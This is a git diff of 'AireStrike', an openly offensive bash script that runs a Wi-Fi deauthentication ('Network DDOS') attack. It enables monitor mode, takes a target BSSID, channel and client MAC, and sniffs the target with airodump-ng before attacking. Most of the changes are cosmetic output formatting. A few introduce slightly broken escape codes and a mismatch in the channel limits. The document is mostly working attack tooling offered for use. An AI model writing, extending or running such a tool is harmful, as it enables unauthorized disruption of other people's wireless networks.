@@ -64,13 +64,14 @@ echo -e "\e[36m[I]Start DDOS Attack          \e[36m[II]Stop DDOS Attack         
 
 # Space
 
-read -p $'\033[1;33mPlease Choose An Option:\033[0m' SELECT 
+echo -e -n "\033[1;33m| Please Choose An Option:\033[0m "
+read SELECT
 
 
 case $SELECT in
 
 
-  I) echo -e "\033[1;36mStarting Network DDOS Attack...\033[0m" | pv -qL 20 
+  I) echo -e "\033[1;32m|...Starting Network DDOS Attack...|\033[0m" | pv -qL 20 
   sleep 3
 
 sudo fastfetch
@@ -80,12 +81,12 @@ sleep 1
 sudo iw dev
 sleep 1
 if ip link show wlan0mon >/dev/null 2>&1; then
-    echo "[+] wlan0mon is already in monitor mode. Proceeding..."
+    echo -e "\033[1;32m |>>>[+] Wlan0mon Is Already In Monitor Mode!..Proceeding...|\033[0m"
 elif ip link show wlan0 >/dev/null 2>&1; then
-    echo "[+] Enabling monitor mode on wlan0..."
+    echo -e "\033[1;31m |>>>[+] Enabling monitor mode on wlanX...|\033[0m"
    sudo airmon-ng start wlan0
 else
-    echo "[-] Error: Neither wlan0 nor wlan0mon was found."
+    echo -e "\033[1;31m |:::[-] Error: Neither wlan[X] nor wlan[X]mon was found!:::|\033[0m"
     exit 1
 fi
 sleep 4
@@ -96,41 +97,42 @@ sleep 3
 
 # Validate BSSID input
 while true; do
-    echo -n "Enter the Target BSSID: "
+    echo -e -n "\033[1;33m |Enter the Target BSSID: \033[0m"
     read bssid
     if [[ $bssid =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
         break
     else
-        echo "Invalid BSSID format. Example format: AA:BB:CC:DD:EE:FF"
+        echo -e "\033[1;31m |:::Invalid BSSID format. Example format: AA:BX:CC:DX:XX:FF [Where X is Constant]:::|\033[0m"
     fi
 done
 
 # Validate Channel input
 while true; do
-    echo -n "Enter the Target Channel (1-170): "
+    echo -e -n "\033[1;33m |Enter The Target Channel (1-173):\033[0m "
     read channel
-    if [[ $channel =~ ^[0-9]+$ ]] && [ "$channel" -ge 1 ] && [ "$channel" -le 170 ]; then
+    if [[ $channel =~ ^[0-9]+$ ]] && [ "$channel" -ge 1 ] && [ "$channel" -le 174 ]; then
         break
     else
-        echo "Invalid channel number. Please enter a number between 1 and 170."
+        echo -e -n "\031[1;31m |:::Invalid channel number! Please enter a number between 1 and 173!:::|\033[0m"
     fi
 done
 
 # Validate Client MAC input (Optional)
 while true; do
-    echo -n "Enter the Target MAC (or press Enter for all): "
+    echo -e -n "\033[1;33m |Enter the Target MAC (or press Enter for all):\033[0m "
     read mac
     if [[ -z "$mac" || $mac =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
     break
 
     else
-        echo "Invalid MAC address format. Example format: AA:BB:CC:DD:EE:FF"
+        echo -e -n "\033[1;31m |:::Invalid MAC address format. Example format: AA:BX:CC:DX:XX:FF [Where X is Constant]:::|\033[0m"
     fi
 done
 
 # Execution of Deauthentication Attack
 while true; do
-echo 'Sniffing The Target $bssid On Channel $channel [if Mac] & Mac Through $mac...'
+echo -e -n "\033[1;32m|...Sniffing The Target On The Specified Channel [if Mac] & Mac...|\033[1;33m"
+sleep 1
 sudo airodump-ng --bssid $bssid --channel $channel wlan0mon
 sleep 3
 
@@ -143,19 +145,21 @@ else
 
 fi
 
+            break
+
 done
 
 clear
 
-echo -e "\033[1;33m"
-echo -e "\n\033[1;33mContinue...\033[0m" | pv -qL 30 
+echo -e "\033[1;32m"
+echo -e "\033[1;32m |...Continue...|\033[0m" | pv -qL 30 
 echo -e "\033[0m"
-echo -e "\n\033[1;33mEntering The Main Menu...\033[0m" | pv -qL 20 
+echo -e "\n\033[1;33m |...Entering The Main Menu...|\033[0m" | pv -qL 20 
 bash airestrike.sh
 
   ;;
 
-II) echo -e "\033[1;36mTerminating Network DDOS Attack...\033[0m" | pv -qL 20 
+ II) echo -e "\033[1;32m|...Terminating Network DDOS Attack...|\033[0m" | pv -qL 20 
     sleep 3
 
 sudo iw dev
@@ -163,17 +167,19 @@ sudo airmon-ng check kill
 sleep 1
 sudo airmon-ng stop wlan0mon
 sleep 1
+echo -e "\033[1;32m |>>>[+]Wifi [Card/Adapter] Is Set To Managed Mode<<<|\033[0m"
 sudo systemctl restart NetworkManager.service
+echo -e "\033[1;32m |>>>[+]Restarting Network Manager && Establishing Existing Internet Connection<<<|\033[0m"
 sleep 3
 sudo iw dev
 sleep 4
 clear
 
-echo -e "\033[1;33m" | pv -qL 20 
-echo -e "\033[1;36mActivating Peaceful Mode...\033[0m" | pv -qL 20 
-echo -e "\033[1;36mOperation Complete!\033[0m" | pv -qL 20
+echo -e "\033[1;32m" | pv -qL 20 
+echo -e "\033[1;32m |>>>Activating Peaceful Mode...|\033[0m" | pv -qL 20 
+echo -e "\033[1;32m |...Operation Complete!...|\033[0m" | pv -qL 20
 echo -e "\033[0m" | pv -qL 20
-echo -e "\n\033[1;33mEntering The Main Menu...\033[0m" | pv -qL 20 
+echo -e "\n\033[1;33m |...Entering The Main Menu...\033[0m" | pv -qL 20 
 bash airestrike.sh
 
   ;;
@@ -182,10 +188,10 @@ bash airestrike.sh
 
     E)
       clear
-      echo -e "\033[1;33m"
-      echo "Thank you for using AireStrike!" | pv -qL 20
-      echo "Created by H4CKER from ANON" | pv -qL 20
-      echo "Follow on GitHub for updates..!" | pv -qL 20
+      echo -e "\032[1;33m"
+      echo " |<<<Thank you for using AireStrike!>>>|" | pv -qL 20
+      echo " ||Created by H4CKER from ANON||" | pv -qL 20
+      echo " |Follow on GitHub for updates!...|" | pv -qL 20
       echo -e "\033[0m"
       clear
       exit 00
@@ -193,22 +199,22 @@ bash airestrike.sh
       ;;
 
     *)
-      echo -e "\033[1;31mInvalid Option\033[0m" | pv -qL 20 
+      echo -e "\033[1;31m|Invalid Option|\033[0m" | pv -qL 20 
       sleep 1
       clear
       bash airestrike.sh
       
       ;;
 
-   Q|q) echo -e "\n\033[1;31mExiting AireStrike...\033[0m" 
+   Q|q) echo -e "\n\033[1;31m|>>>Exiting AireStrike...|\033[0m" 
         clear
         exit 00
         clear
 
       ;;
 
-   *) echo -e "\033[1;31mInvalid Option\033[0m"
-      echo -e "\033[1;31Entering The Main Menu\033[0m"
+   *) echo -e "\031[1;31m|Invalid Option|\033[0m"
+      echo -e "\033[1;31|Entering The Main Menu|\033[0m"
       clear
       bash airestrike.sh
 
